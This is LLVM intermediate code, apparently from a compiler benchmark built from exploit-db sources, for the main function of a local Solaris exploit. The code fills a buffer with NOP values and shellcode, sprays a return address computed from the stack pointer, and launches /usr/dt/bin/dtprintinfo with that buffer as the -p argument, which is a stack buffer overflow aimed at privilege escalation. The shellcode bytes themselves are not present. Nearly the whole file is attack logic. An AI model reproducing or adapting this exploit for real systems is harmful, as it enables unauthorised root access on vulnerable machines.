; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19205.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19205.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [6 x i8] c"LANG=\00", align 1
@i = common dso_local global i64 0, align 8
@BUFSIZE = common dso_local global i64 0, align 8
@NOP = common dso_local global i32 0, align 4
@x = common dso_local global i32* null, align 8
@exploit_code = common dso_local global i32* null, align 8
@STARTADR = common dso_local global i64 0, align 8
@ret_adr = common dso_local global i32 0, align 4
@ADJUST = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [24 x i8] c"/usr/dt/bin/dtprintinfo\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"dtprintinfo\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-p\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %2 = call i32 @putenv(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  store i64 0, i64* @i, align 8
  br label %3

3:                                                ; preds = %12, %0
  %4 = load i64, i64* @i, align 8
  %5 = load i64, i64* @BUFSIZE, align 8
  %6 = icmp ult i64 %4, %5
  br i1 %6, label %7, label %15

7:                                                ; preds = %3
  %8 = load i32, i32* @NOP, align 4
  %9 = load i32*, i32** @x, align 8
  %10 = load i64, i64* @i, align 8
  %11 = getelementptr inbounds i32, i32* %9, i64 %10
  store i32 %8, i32* %11, align 4
  br label %12

12:                                               ; preds = %7
  %13 = load i64, i64* @i, align 8
  %14 = add i64 %13, 1
  store i64 %14, i64* @i, align 8
  br label %3

15:                                               ; preds = %3
  store i64 0, i64* @i, align 8
  br label %16

16:                                               ; preds = %31, %15
  %17 = load i64, i64* @i, align 8
  %18 = load i32*, i32** @exploit_code, align 8
  %19 = call i64 @strlen(i32* %18)
  %20 = icmp ult i64 %17, %19
  br i1 %20, label %21, label %34

21:                                               ; preds = %16
  %22 = load i32*, i32** @exploit_code, align 8
  %23 = load i64, i64* @i, align 8
  %24 = getelementptr inbounds i32, i32* %22, i64 %23
  %25 = load i32, i32* %24, align 4
  %26 = load i32*, i32** @x, align 8
  %27 = load i64, i64* @STARTADR, align 8
  %28 = load i64, i64* @i, align 8
  %29 = add i64 %27, %28
  %30 = getelementptr inbounds i32, i32* %26, i64 %29
  store i32 %25, i32* %30, align 4
  br label %31

31:                                               ; preds = %21
  %32 = load i64, i64* @i, align 8
  %33 = add i64 %32, 1
  store i64 %33, i64* @i, align 8
  br label %16

34:                                               ; preds = %16
  %35 = call i32 (...) @get_sp()
  %36 = sub nsw i32 %35, 1292
  %37 = add nsw i32 %36, 148
  store i32 %37, i32* @ret_adr, align 4
  %38 = load i64, i64* @ADJUST, align 8
  store i64 %38, i64* @i, align 8
  br label %39

39:                                               ; preds = %70, %34
  %40 = load i64, i64* @i, align 8
  %41 = icmp ult i64 %40, 400
  br i1 %41, label %42, label %73

42:                                               ; preds = %39
  %43 = load i32, i32* @ret_adr, align 4
  %44 = and i32 %43, 255
  %45 = load i32*, i32** @x, align 8
  %46 = load i64, i64* @i, align 8
  %47 = add i64 %46, 0
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  store i32 %44, i32* %48, align 4
  %49 = load i32, i32* @ret_adr, align 4
  %50 = ashr i32 %49, 8
  %51 = and i32 %50, 255
  %52 = load i32*, i32** @x, align 8
  %53 = load i64, i64* @i, align 8
  %54 = add i64 %53, 1
  %55 = getelementptr inbounds i32, i32* %52, i64 %54
  store i32 %51, i32* %55, align 4
  %56 = load i32, i32* @ret_adr, align 4
  %57 = ashr i32 %56, 16
  %58 = and i32 %57, 255
  %59 = load i32*, i32** @x, align 8
  %60 = load i64, i64* @i, align 8
  %61 = add i64 %60, 2
  %62 = getelementptr inbounds i32, i32* %59, i64 %61
  store i32 %58, i32* %62, align 4
  %63 = load i32, i32* @ret_adr, align 4
  %64 = ashr i32 %63, 24
  %65 = and i32 %64, 255
  %66 = load i32*, i32** @x, align 8
  %67 = load i64, i64* @i, align 8
  %68 = add i64 %67, 3
  %69 = getelementptr inbounds i32, i32* %66, i64 %68
  store i32 %65, i32* %69, align 4
  br label %70

70:                                               ; preds = %42
  %71 = load i64, i64* @i, align 8
  %72 = add i64 %71, 4
  store i64 %72, i64* @i, align 8
  br label %39

73:                                               ; preds = %39
  %74 = load i32*, i32** @x, align 8
  %75 = load i64, i64* @BUFSIZE, align 8
  %76 = getelementptr inbounds i32, i32* %74, i64 %75
  store i32 0, i32* %76, align 4
  %77 = load i32*, i32** @x, align 8
  %78 = call i32 @execl(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32* %77, i8* null)
  %79 = load i32, i32* %1, align 4
  ret i32 %79
}

declare dso_local i32 @putenv(i8*) #1

declare dso_local i64 @strlen(i32*) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
